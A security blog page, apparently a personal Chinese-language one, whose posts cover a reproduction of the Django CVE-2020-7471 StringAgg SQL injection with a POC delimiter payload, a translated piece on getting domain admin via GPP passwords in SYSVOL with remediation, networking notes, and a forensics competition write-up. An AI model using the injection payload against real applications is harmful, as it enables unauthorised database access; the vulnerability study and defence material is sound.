<p>这个查询操作就是查询 Info 对应的 postgres 数据表的 gender 列，将gender相同的 name 列使用横线连接聚合，输入如下：</p>
<img src="/2021/03/29/Django-sql/blog\source\_posts\Django-sql\12.jpg" style="zoom:65%;">

<p>漏洞位于django/django/contrib/postgres/aggregates/general.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from django.contrib.postgres.aggregates import StringAgg</span><br></pre></td></tr></table></figure>

<p>可以看到官方使用Value函数来防止注入，Value函数的内容如下</p>
<img src="/2021/03/29/Django-sql/blog\source\_posts\Django-sql\10.jpg" style="zoom:85%;">

<img src="/2021/03/29/Django-sql/blog\source\_posts\Django-sql\11.jpg" style="zoom:90%;">

<p>Value参数会被添加到sql参数列表，然后被Django内置的过滤机制过滤，来防注。</p>
<p>编写fuzz测试delimiter 是如何导致SQL 注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for c in &quot;!@#$%^&amp;*()_+&#x3D;-|\\\&quot;&#39;:;?&#x2F;&gt;.&lt;,&#123;&#125;[]&quot;:</span><br><span class="line">    results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;,delimiter&#x3D;c))</span><br><span class="line">    try:</span><br><span class="line">      for e in results:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<p>测试发现，当delimiter为单引号时，会报错。可以看出单引号未经过任何转义嵌入到了 SQL 语句中，然后需要追踪内部程序找出完整的 SQL 语句上下文。</p>
<p>POC如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;&quot;-&quot;))</span><br><span class="line">results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;&quot;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &quot;))</span><br></pre></td></tr></table></figure>

<p>该语句使用StringAgg类，用于将输入的值使用delimiter分隔符级联。原本的语句中，查询info对应的gender列，并使用**-<strong>来连接。就可以</strong>通过修改delimiter的内容来实现注入**。</p>
<p>当设置delimiter为 单引号时，会报错，在postgresql中变成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;vul_app_info&quot;.&quot;gender&quot;, STRING_AGG(&quot;vul_app_info&quot;.&quot;name&quot;, &#39;&#39;&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1</span><br></pre></td></tr></table></figure>

<p>当三个单引号时，同样报错，此时将delimiter设置为’)–就可以注释掉FROM语句，从而构造payload。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &#39;</span><br></pre></td></tr></table></figure>

<p>以下paoload，当</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;-&#39;</span><br><span class="line">   results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;payload))</span><br><span class="line">   for e in results:</span><br><span class="line">       print(e)</span><br><span class="line">   print(&quot;[+]注入后的的输出：&quot;)</span><br><span class="line">   payload &#x3D; &#39;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &#39;</span><br><span class="line">   results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;payload))</span><br><span class="line">   for e in results:</span><br><span class="line">       print(e)</span><br></pre></td></tr></table></figure>



<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><ul>
<li>影响版本<br>Django 1.11.x &lt; 1.11.28<br>Django 2.2.x &lt; 2.2.10<br>Django 3.0.x &lt; 3.0.3<br>Django 主开发分支<br>其中Django 1.11.28、Django 2.2.10、Django 3.0.3不受影响。</li>
<li>测试环境<br>kalil<br>Django 3.0.2<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2>pip install django==3.0.2<br>安装postgres数据库，创建数据库test,并修改数据库密码<br><img src="/2021/03/29/Django-sql/1.png"><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2></li>
</ul>
<ol>
<li>由于刚才更改了数据库密码，于是更改配置文件的数据库名称以及密码<br>进入CVE-2020-7471/sqlvul_projects/settings.py，修改数据库配置，如果之前安装postgres数据库使用的默认配置（包括密码），这里就不需修改任何任何配置.<br>此处只需修改password为刚才设置密码。<br><img src="/2021/03/29/Django-sql/2.png"><br><img src="/2021/03/29/Django-sql/3.png"></li>
<li>再利用CVE-2020-7471/manage.py初始化测试数据库test数据库中的表<br><img src="/2021/03/29/Django-sql/4.jpg"><br>初始化环境完成。</li>
<li>进入test数据库查看表<br>进入数据库<br>\c test<br>查看全部表<br>\d<br><img src="/2021/03/29/Django-sql/5.jpg"><br>查看表vul_app_info的信息<br>select * from vul_app_info;<br><img src="/2021/03/29/Django-sql/6.jpg"><br>可以看到此刻表为空</li>
<li>执行POC向数据库写入数据<br><img src="/2021/03/29/Django-sql/7.jpg"><br>若执行成功POC中将插入三条数据<br>利用CVE-2020-7471/CVE-2020-7471.py写入数据<br><img src="/2021/03/29/Django-sql/8.jpg"><br><img src="/2021/03/29/Django-sql/9.jpg"><br>写入成功。<h2 id="0x05-升级到最新版本"><a href="#0x05-升级到最新版本" class="headerlink" title="0x05 升级到最新版本"></a>0x05 升级到最新版本</h2>升级到Django最新版3.0.3<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/255947.html">https://www.freebuf.com/vuls/255947.html</a><br><a target="_blank" rel="noopener" href="https://github.com/Saferman/CVE-2020-7471">https://github.com/Saferman/CVE-2020-7471</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/28/domain/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/28/domain/" class="post-title-link" itemprop="url">域渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-28 19:57:57" itemprop="dateCreated datePublished" datetime="2021-03-28T19:57:57+08:00">2021-03-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-30 15:39:47" itemprop="dateModified" datetime="2021-03-30T15:39:47+08:00">2021-03-30</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="翻译和复现Attack-Methods-for-Gaining-Domain-Admin-Rights-in-Active-Directory"><a href="#翻译和复现Attack-Methods-for-Gaining-Domain-Admin-Rights-in-Active-Directory" class="headerlink" title="翻译和复现Attack Methods for Gaining Domain Admin Rights in Active Directory"></a>翻译和复现Attack Methods for Gaining Domain Admin Rights in Active Directory</h1><p> 攻击者有很多方法可以获得活动目录中的域管理权限。本篇文章旨在介绍一些目前比较流行的方法。这里描述的 “assume breach”建立在攻击者已经在内部系统上有了立足点，并获得了域用户凭证（即后渗透阶段）。<br>不幸的是，对于大多数企业来说，攻击者从域用户到域管理员往往不需要很长时间。防御者心中的问题是 “这种情况是如何发生的？”。<br>攻击通常从向用户发送鱼叉式钓鱼电子邮件开始，使攻击者能够在目标网络内的计算机上运行代码。一旦攻击者让他们的代码在企业内部运行，第一步就是进行侦察，发现可用资源，从而提升权限，坚持下去，当然还有收集关键信息（通常是一个组织的 “皇冠上的珠宝”）。<br>While the overall process detail varies, the overall theme remains:<br>虽然流程细节各不相同，但总的主题仍然是：<br>恶意软件注入(鱼叉式钓鱼、web漏洞等)<br>内部侦察<br>窃取凭证<br>利用及提权<br>数据访问及过滤<br>后门维持<br>攻击者首先得在企业内部有一个立足点。此外，攻击者通常从攻击者的用户权限提升到本地管理员权限并不是很难。提权利用可以通过利用系统上未打补丁的权限升级漏洞来实现，更为常见的是在SYSVOL（如组策略首选项）中找到本地管理员密码。<br>在2015年举办的BSides, Shakacon, Black Hat, DEF CON, 和 DerbyCon这五个安全会议中，我谈到了本文中的大部分技术。<br>我也在 “The Most Common Active Directory Security Issues and What You Can Do to Fix Them “一文中介绍了其中的一些问题。</p>
<p>从域用户到域管理员的攻击技术：<br>1.SYSVOL和组策略首选项中的密码<br>这种方法是最简单的，不需要特殊的 “黑客 “工具。攻击者所要做的就是打开Windows资源管理器，搜索域SYSVOL DFS共享中的XML文件。大多数情况下，groups.xml、scheduletasks.xml、Services.xml等XML文件会包含凭证。</p>
<p>SYSVOL是Active Directory中的域范围共享，AD中所有经过认证的用户都可以读取访问。SYSVOL包含登录脚本、组策略数据和其他需要在有域控制器的任何地方提供的域范围内的数据（因为SYSVOL在所有域控制器之间自动同步和共享）。所有域组策略都存储在这里/DOMAIN&gt; /SYSVOL/<br><DOMAIN>/Policies/</DOMAIN></p>
<p>当创建一个新的GPP时，会在SYSVOL中创建一个相关的XML文件，里面有相关的配置数据，如果有提供密码，则是AES-256加密、。</p>
<p>除了在2012年之前，微软在MSDN上公布了AES加密密钥（共享秘密），可以用来解密密码。由于经过认证的用户（任何域用户或受信任域中的用户）都有对SYSVOL的读取权限，因此域中的任何人都可以在SYSVOL共享中搜索包含 “cpassword “的XML文件，该文件是包含AES加密密码的值。<br><img src="/2021/03/28/domain/1.png"><br>通过访问这个XML文件，攻击者可以使用AES私钥来解密GPP密码。PowerSploit函数Get-GPPPassword对于组策略优先级的利用最为有用。以上截图显示了一个类似的PowerShell函数，从SYSVOL中找到的XML文件中加密GPP密码。<br><img src="/2021/03/28/domain/2.png"><br>其他文件类型也可能有内嵌的密码（通常是明文的），如vbs和bat。<br><img src="/2021/03/28/domain/3.jpeg"><br>我们会认为，随着补丁的发布，管理员应该不会再在组策略首选项中放置凭证，但是我在评估客户安全时，仍然会在SYSVOL中发现凭证。</p>
<p>解决方法：</p>
<ul>
<li>在每台用于管理GPO的计算机上安装KB2962486，它可以防止新的凭证被放在组策略首选项中。</li>
<li>删除SYSVOL中包含密码的现有GPP xml文件。</li>
<li>不要把密码放在所有经过认证的用户都能访问的文件中。<br>关于这种攻击方法的更多信息在帖子中介绍。Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences.</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/28/sparrow/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/28/sparrow/" class="post-title-link" itemprop="url">小知识思考</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-28 15:26:51" itemprop="dateCreated datePublished" datetime="2021-03-28T15:26:51+08:00">2021-03-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-03 16:25:48" itemprop="dateModified" datetime="2021-04-03T16:25:48+08:00">2021-04-03</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>鉴于经常会有奇怪的思想，故而为自己专门书写这么一篇文章，想到什么记什么。</p>
<p>包含<strong>任务、所好奇之事</strong>等</p>
<h2 id="0x02-具现"><a href="#0x02-具现" class="headerlink" title="0x02 具现"></a>0x02 具现</h2><h3 id="1-一次百度涉及-从浏览器输入URL到浏览器显示页面发生了什么？"><a href="#1-一次百度涉及-从浏览器输入URL到浏览器显示页面发生了什么？" class="headerlink" title="1. 一次百度涉及?从浏览器输入URL到浏览器显示页面发生了什么？"></a>1. 一次百度涉及?从浏览器输入URL到浏览器显示页面发生了什么？</h3><ol>
<li><p><strong>输入地址</strong><br>输入地址时，浏览器其实已经开始只能匹配URL，用于补全。当然如果有缓存，直接从缓存中展示网页。</p>
</li>
<li><p><strong>浏览器查找域名IP</strong><br>查看本地hosts文件，查看其中是否有与此域名对应的规则，如果有，则直接用此IP；<br>若无，向本地DNS服务器(自己网络接入服务器商所提供)发出请求，服务器会查询其缓存记录；<br>若无，本地服务器向DNS根服务器查询；<br>若无，根据跟服务器给出的域服务器地址，让本地DNS服务器去找域服务器；<br>.com域服务器返回本地服务器的域名解析服务器的地址；<br>本地服务器向域名解析服务器发出请求，收到域名与IP地址的对应关系。并保存于缓存中用于下次快速访问。</p>
</li>
<li><p><strong>浏览器向web服务器发送HTTP请求</strong><br>浏览器以随机端口[1024-65535]向服务器的web服务(nginx、httpd)80端口发起TCP连接请求。通过多种路由设备，进入网卡，然后进入到内核的TCP/IP协议栈对该包进行解封。可能还要经过Netfilter防火墙(内核模块的过滤)<br>，最终到达web程序，建立TCP连接。常称TCP三次握手。<br>建立TCP连接后，发起HTTP请求。GET、POST、PUT 和 DELETE 、HEAD、OPTION以及 TRACE。<br>http请求一般包含三部分：请求方法URL协议/版本(第一行)、请求头(Request Header)、请求正文。<br>请求头和请求正文之前存在一个空行，表示请求头已经结束，接下来的是请求正文</p>
</li>
<li><p><strong>服务器的永久重定向响应</strong><br>server给浏览器响应一个301永久重定向响应，301永久重定向：把带www的和不带www的访问地址归到同一个网站排名下</p>
</li>
<li><p><strong>浏览器跟踪重定向地址</strong><br>浏览器知道<a target="_blank" rel="noopener" href="http://www.google.com/">http://www.google.com/</a> 是访问的正确地址，所以发送另一个http请求。</p>
</li>
<li><p><strong>服务器处理请求</strong><br>后端从固定端口接收TCP报文，处理TCP连接，解析HTTP协议，按照报文格式封装成供上层使用的HTTP Request对象；<br>大网站使用反向代理服务器时，客户端先请求到nginx，nginx再请求应用服务器，最后将结果返回给客户端，Nginx是反向代理服务器。以免某台服务器down了，影响用户使用。<br><img src="/2021/03/28/sparrow/3.jpg"></p>
</li>
<li><p><strong>服务器返回一个HTTP响应</strong><br>HTTP响应与HTTP请求相似，由3个部分构成:状态行、响应头(Response Header)、响应正文</p>
</li>
</ol>
<ol start="8">
<li><strong>浏览器显示 HTML</strong><br>WebKit引擎渲染的过程：<br>解析html以构建dom树 -&gt; 构建render树 -&gt; 布局render树 -&gt; 绘制render树</li>
<li><strong>浏览器发送请求获取嵌入在 HTML 中的资源（如图片、音频、视频、CSS、JS等等）</strong></li>
</ol>
<ul>
<li><p>DNS负载均衡<br>针对请求资源膨胀的情况，为了防止机子down掉。<br>原理：在DNS服务器中为同一个主机名配置多个IP地址，在应答DNS查询时，将DNS文件中主机记录的IP地址按顺序访问返回不同的解析结果。使得不同客户端访问不同服务器，从而能达到负载均衡的目的。</p>
</li>
<li><p>为什么需要三次握手？</p>
</li>
</ul>
<p><strong>第一次握手：</strong>client将标志位SYN置为1,随机产生一个值为seq=J（J的取值范围为=1234567）的数据包到服务器，client进入SYN_SENT状态，等待server确认；</p>
<p><strong>第二次握手：</strong>server收到数据包后由标志位SYN=1知道client请求建立连接，server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给client以确认连接请求，server进入SYN_RCVD状态。</p>
<p><strong>第三次握手：</strong>client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给server，server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，client和server进入ESTABLISHED状态，完成三次握手，随后client与server之间可以开始传输数据了。</p>
<p>三次握手”的目的是为了<strong>防止已失效的连接请求报文段突然又传送到了服务端，产生错误。</strong><br>某滞留请求延迟发给服务端，服务器返回确认报文，若是client一直不确认，server会一直等待，造成资源浪费。<br><img src="/2021/03/28/sparrow/1.jpg"></p>
<ul>
<li>为什么需要四次挥手？</li>
<li><em>第一次挥手：</em>* Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态。</li>
</ul>
<p><strong>第二次挥手：</strong> Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与- SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。</p>
<p><strong>第三次挥手：</strong> Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。</p>
<p><strong>第四次挥手：</strong> Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。<br>四次挥手，在server收到对方的FIN时，表示client不再发送数据，但是还可以接收server的数据。所以将ACK和FIN分开发送。<br><img src="/2021/03/28/sparrow/2.jpg"></p>
<h3 id="3-命令"><a href="#3-命令" class="headerlink" title="3.命令"></a>3.命令</h3><p>tar xzvf<br>sudo ufw disable</p>
<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/24/changAnCup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/24/changAnCup/" class="post-title-link" itemprop="url">2019 ChangAn Cup复盘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-03-24 19:57:41 / 修改时间：20:49:53" itemprop="dateCreated datePublished" datetime="2021-03-24T19:57:41+08:00">2021-03-24</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/" itemprop="url" rel="index"><span itemprop="name">电子数据取证</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>话不多说 直接复盘 查漏补缺</p>
<h2 id="0x02-分析思路"><a href="#0x02-分析思路" class="headerlink" title="0x02 分析思路"></a>0x02 分析思路</h2><h3 id="检材1："><a href="#检材1：" class="headerlink" title="检材1："></a>检材1：</h3><p>使用仿真对检材1进行分析，开机后发现该Linux无法使用密码远程连接，修改配置文件/etc/ssh/sshd_config文件进行配置：<br>把PasswordAuthentication后的参数改为yes，重启ssh服务（systemctl restart sshd）即可使用远程工具连接；<br><img src="/2021/03/24/changAnCup/clipboard.png"></p>
<p>查看历史执行命令history，可看到少数命令，怀疑本地的历史命令被加密，/var/log日志目录被删除：<br><img src="/2021/03/24/changAnCup/1.png"><br>netstat -anptl查看服务器开启的端口发现8091和39999上有docker-proxy<br><img src="/2021/03/24/changAnCup/2.png"><br>使用docker ps命令查看docker容器情况，发现docker运行了3个容器，其中验证了第二个ssh的容器属于干扰项，没有作用；<br><img src="/2021/03/24/changAnCup/3.png"><br><img src="/2021/03/24/changAnCup/4.png"></p>
<p>id为16fc..的容器将自身80端口映射到了本机8091端口上，主要运行的命令为nginx；<br>id为53766的容器开启了8012端口，主要运行命令docker-entrypoint.sh；<br>使用docker inspect 命令可以查看到容器详细信息，如下：<br><img src="/2021/03/24/changAnCup/5.png"><br><img src="/2021/03/24/changAnCup/6.png"><br><img src="/2021/03/24/changAnCup/7.png"><br><img src="/2021/03/24/changAnCup/8.png"><br><img src="/2021/03/24/changAnCup/9.png"><br><img src="/2021/03/24/changAnCup/10.png"><br><img src="/2021/03/24/changAnCup/11.png"><br><img src="/2021/03/24/changAnCup/12.png"><br>使用命令 docker exec -it id号 /bin/bash可以进入到容器内部，16fc160060c1容器内主要运行nginx服务，因此查看nginx配置文件：<br><img src="/2021/03/24/changAnCup/13.png"><br><img src="/2021/03/24/changAnCup/14.png"><br>通过查看nginx配置文件可以知道，nginx访问日志放在相对路径logs下的jrweb.log中，nginx将所有来自自身80端口的请求转发到IP为172.17.0.3的8012端口上，由ID为53766d68636f的容器开启的8012端口可知，应该是转发到该容器，该容器（53766d68636f）在案件中的ip应为172.172.0.3（由于出题时候未设固定ip因此每个人仿真起来之后ip可能会发生变化，前面查看docker inspect时候可看到该容器ip变化为172.17.0.2）；<br><img src="/2021/03/24/changAnCup/15.png"><br>通过查看访问网站的访问日志jrweb.log可知，该网站案发当时的IP地址为192.168.184.128，使用端口8091，分别有ip192.168.184.1和192.168.184.133对该网站进行过访问，133的ip可以看到有尝试登陆的请求；<br><img src="/2021/03/24/changAnCup/16.png"><br>查看Id为53766d68636f的容器，查看history命令可知网站路径为/home/vue2-element-touzi-admin（物理机路径可以查看前面docker inspect），<br><img src="/2021/03/24/changAnCup/17.png"><br><img src="/2021/03/24/changAnCup/18.png"><br>网站根目录下有README.md文件，通过查看可了解网站大致的配置情况，查看server目录下的index.js可知网站的主要配置情况<br><img src="/2021/03/24/changAnCup/19.png"><br>查看server目录下的api.js文件课知，该文件引用了当前目录下的db文件<br><img src="/2021/03/24/changAnCup/20.png"><br>查看网站/server目录下的db.js文件可知，该网站使用mongo的数据库，数据库用户名和密码为root、root，网站使用站库分离结构，数据地址位于192.168.184.129（该ip为检材2的解压密码），使用端口27017，使用的databases为tougu；<br><img src="/2021/03/24/changAnCup/21.png"></p>
<h3 id="检材2："><a href="#检材2：" class="headerlink" title="检材2："></a>检材2：</h3><p>使用192.168.184.129对检材2进行解压，对检材计算哈希并及进行静态分析和仿真：<br>使用history命令发现如下信息：下载过某程序、执行了encrypt（5）程序，删掉了之前的bash历史记录：<br><img src="/2021/03/24/changAnCup/22.png"><br>前面分析已知该服务器为mongodb服务器，通过端口确认mongo监听在27017端口<br><img src="/2021/03/24/changAnCup/23.png"><br>通过/root/.dbshell发现数据库操作的shell记录，里面发现几条重要信息（由于shell没有时间戳，只能用来推测不能单过证据）<br><img src="/2021/03/24/changAnCup/24.png"><br>通过查看mongo进程信息发现mongo的配置信息，查看mongod.conf文件发现mongod的日志配置情况和安装物理路径。<br><img src="/2021/03/24/changAnCup/25.png"><br><img src="/2021/03/24/changAnCup/26.png"><br>结合系统登陆日志和mongo的日志查看，发现在时间7-11 18：05至18：32分中间，133IP一直在登录状态，同时间没有其他用户登陆，日志中，同时间端发现大量的操作日志，drop为删除数据库指令<br><img src="/2021/03/24/changAnCup/27.png"><br><img src="/2021/03/24/changAnCup/28.png"><br><img src="/2021/03/24/changAnCup/29.png"><br><img src="/2021/03/24/changAnCup/30.png"></p>
<h3 id="检材3"><a href="#检材3" class="headerlink" title="检材3"></a>检材3</h3><p>使用192.168.184.133对检材3进行解压，对检材计算哈希并及进行静态分析和仿真：<br>通过history命令查看历史命令记录，可以看到大量安装配置pptpd（pptpd是指运行在服务器上提供pptp协议服务的软件）的命令：<br><img src="/2021/03/24/changAnCup/31.png"><br>其中还有大量修改时区信息的命令<br><img src="/2021/03/24/changAnCup/32.png"><br>数据包抓取的命令：<br><img src="/2021/03/24/changAnCup/33.png"><br>通过查看pptpd的配置文件可知如下信息：配置了options.pptpd、开启写入wtmp、定义了本地远程IP地址（可以参看教程<a target="_blank" rel="noopener" href="https://blog.csdn.net/ljm_503909378/article/details/41478121%EF%BC%89%EF%BC%9A">https://blog.csdn.net/ljm_503909378/article/details/41478121）：</a><br><img src="/2021/03/24/changAnCup/34.png"><br><img src="/2021/03/24/changAnCup/35.png"><br><img src="/2021/03/24/changAnCup/36.png"><br>查看/etc/ppp/options.pptp文件可以知道，pptpd开启了日志信息，记录在/var/log/pptpd.log中（当然在历史命令中也可以得知该日志）：<br><img src="/2021/03/24/changAnCup/37.png"><br>继续查看该目录下的chap-secrets文件，该文件为用户验证文件，记录了客户端的使用名称和密码：<br><img src="/2021/03/24/changAnCup/38.png"><br>查看pptpd的日志进行分析，发现IP为172.16.80.188通过账号VPN1成功登陆VPN服务器，时间为2019-07-13 14：15：37 UTC+6(注意！该服务器时区为UTC+6,与北京时间相差2小时)，这段时间内还有多个IP通过VPN2\3\4等账号连结果vpn服务器（干扰项），结合下面的PCAP文件可以进行排查筛选：<br><img src="/2021/03/24/changAnCup/39.png"><br><img src="/2021/03/24/changAnCup/40.png"><br><img src="/2021/03/24/changAnCup/41.png"><br>查看last登陆成功日志可以对应上时间：<br><img src="/2021/03/24/changAnCup/42.png"><br>已知该服务器中存在着数据包文件，将两个文件导出并进行分析，查看到两个文件的内容，该vpn服务器为双网卡，对内IP为192.168.184.133，具备对检材1（192.168.184.128）和检材2（192.168.184.129）访问权限，出口/服务端IP为172.16.80.92，通过分析可发现IP172.16.80.188在北京时间16：15-17：58之前进行了大量的操作，以192.168.184.133的身份对目标网站进行了连接和访问：<br><img src="/2021/03/24/changAnCup/43.png"><br><img src="/2021/03/24/changAnCup/44.png"></p>
<h3 id="检材4"><a href="#检材4" class="headerlink" title="检材4"></a>检材4</h3><p>使用密码172.16.80.188对检材4进行解压，并使用火眼介质分析和火眼仿真对该介质进行动态和静态分析：</p>
<h4 id="1-github访问"><a href="#1-github访问" class="headerlink" title="1.github访问"></a>1.github访问</h4><p>使用火眼介质分析分析上网记录发现目标服务器（192.168.184.128）的访问记录：<br>16:17分找到权限并尝试登陆页面<br><img src="/2021/03/24/changAnCup/45.png"><br>结合前面服务器的登陆日志、网站访问日志、抓包文件等分析结果确认最早入侵时间为北京时间2019-07-13 16：17：35（注意！目标服务器的时区为0时区，与北京时间相差8小时）<br><img src="/2021/03/24/changAnCup/46.png"><br><img src="/2021/03/24/changAnCup/47.png"></p>
<p>在入侵开始时，嫌疑人除访问目标服务器外，还访问了github，根据上网记录登陆github网址查看，搜索用户PackerLin，查看该用户页面，发现其上传过test2的文件，下载后发现为密钥文件，使用该文件尝试连接目标服务器，可以成功登陆，结合检材1默认设置为密钥登陆（禁用密码登陆），可以确认嫌疑人是从git上发现了服务器的连接密钥，从而对服务器实施的入侵。<br><img src="/2021/03/24/changAnCup/48.png"></p>
